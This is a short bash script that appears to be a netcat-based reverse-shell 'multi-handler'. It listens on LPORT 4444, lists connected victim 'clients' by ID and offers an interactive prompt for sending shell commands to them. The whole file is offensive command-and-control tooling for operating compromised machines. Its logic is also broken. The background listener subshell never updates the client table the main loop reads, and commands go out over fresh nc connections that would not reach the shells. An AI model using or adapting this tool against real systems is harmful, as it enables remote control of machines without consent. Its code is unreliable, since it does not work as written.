#!/bin/bash

# Set LHOST and LPORT dynamically (from args, env vars, or prompt)
SERVER_IP="${1:-${LHOST:-0.0.0.0}}"  # Default to 0.0.0.0 if not provided
PORT="${2:-${LPORT:-4444}}"  # Default to 4444 if not provided
LOGFILE="multi-handler.log"
declare -A CLIENTS  # Associative array for Client IDs and sockets

# Start Listener
echo "[+] Starting Multi-Handler on $SERVER_IP:$PORT"
nc -lvkp "$PORT" | while read client; do
    CLIENT_ID=$(uuidgen | cut -c1-8)  # Generate unique ID
    CLIENTS["$CLIENT_ID"]="$client"
    echo "[+] New Client: $client (ID: $CLIENT_ID)"
    echo "$CLIENT_ID $client" >> "$LOGFILE"
done &

# Function to Handle Clients
handle_client() {
    local CLIENT_ID="$1"
    local SOCKET="${CLIENTS[$CLIENT_ID]}"
    
    echo -e "\n[*] Connected to Client $CLIENT_ID. Type 'exit' to return.\n"
    while true; do
        printf "\e[1;34mMultiShell-$CLIENT_ID> \e[0m"
        read CMD
        if [[ "$CMD" == "exit" ]]; then
            echo "[*] Returning to main handler..."
            break
        fi
        echo "$CMD" | nc "${SOCKET%:*}" "${SOCKET#*:}" | tr -d '\r'  # Remove extra newlines
        echo ""  # Ensures a clean output separation
        sleep 0.2
    done
}

# Main Loop to Handle Multiple Clients
while true; do
    if [[ ${#CLIENTS[@]} -gt 0 ]]; then
        echo -e "\n[*] Active Clients:\n"
        printf "%-10s | %-20s\n" "Client ID" "Socket"
        echo "------------------------------------"
        for id in "${!CLIENTS[@]}"; do
            printf "%-10s | %-20s\n" "$id" "${CLIENTS[$id]}"
        done
        echo -e "\n[*] Enter a Client ID to interact, or type 'exit' to quit."

        read -p "Enter Client ID: " inputID
        if [[ "$inputID" == "exit" ]]; then
            echo "[*] Shutting down handler..."
            exit 0
        fi
        if [[ -n "${CLIENTS[$inputID]}" ]]; then
            handle_client "$inputID"
        else
            echo "[!] Invalid Client ID!"
        fi
    fi
    sleep 1
done

